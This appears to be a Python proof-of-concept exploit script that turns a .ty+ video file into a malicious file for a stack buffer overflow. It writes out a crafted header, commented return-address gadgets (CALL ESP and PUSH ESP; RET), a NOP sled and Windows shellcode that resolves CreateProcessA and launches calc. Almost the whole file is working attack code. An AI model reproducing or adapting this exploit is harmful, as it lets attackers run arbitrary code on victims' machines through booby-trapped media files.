import os


# Execute .py on folder with POC.ty+ file

video = "\xF5\x46\x7A\xBD\x00\x00\x00\x02"
video += "\x00\x00\x00\x00\x00\x01\xF7\x04"
video += "\x00\x00\x00\x08\x00\x00\x46\x47"
video += "\x3B\x9A\xCA\x00\x00\x00\xAA\x48"
video += "\x00\x00\x03\x18\x98\x24\x4A\x2D"
video += "\x52\x95\x00\x00\x03\x19\xF2\x30"
video += "\xE1\xA3\x12\x49\x00\x00\x03\x1B"
video += "\x1C\x82\x5B\x61\x52\xD5\x00\x00"
video += "\x03\x1C\xD8\x02\x4F\x84\x2C\xA7"
video += "\x00\x00\x03\x1E\x36\x09\x29\x74"
video += "\x56\x4A\x00\x00\x03\x1F\x6C\x49"
video += "\x6A\xA0\x25\x45"

# 6A575CAD # CALL ESP
# 6A314B52 # PUSH ESP; RET
# 6A55BB57 # PUSH ESP; RET
# 6A56488F # PUSH ESP; RET

#jmp = "\xad\x5c\x57\x6a" # CALL ESP
jmp = "\x52\x4b\x31\x6a" # PUSH ESP; RET
#jmp = "\x57\xbb\x55\x6a" # PUSH ESP; RET
#jmp = "\x8f\x48\x56\x6a" # PUSH ESP; RET

shellcode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
shellcode += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
shellcode += "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
shellcode += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shellcode += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shellcode += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shellcode += "\x45\x81\x3e\x43\x72\x65\x61\x75"
shellcode += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shellcode += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shellcode += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shellcode += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shellcode += "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
shellcode += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
shellcode += "\x53\x53\x53\x53\x52\x53\xff\xd7"

fruit = video + jmp + "\x90" * 16 + shellcode

# FILE with payload
POCPayload = open("POCPayload.ty+", "wb")

# Original FILE
POCFile = open("POC.ty+", "rb")


# Find offset of ty+ magic bytes to overwrite
hFile = POCFile.read()
offset = hFile.index("\xF5\x46\x7A\xBD")

hFile = hFile[:offset] + fruit

POCPayload.write(hFile)
POCPayload.close()
POCFile.close()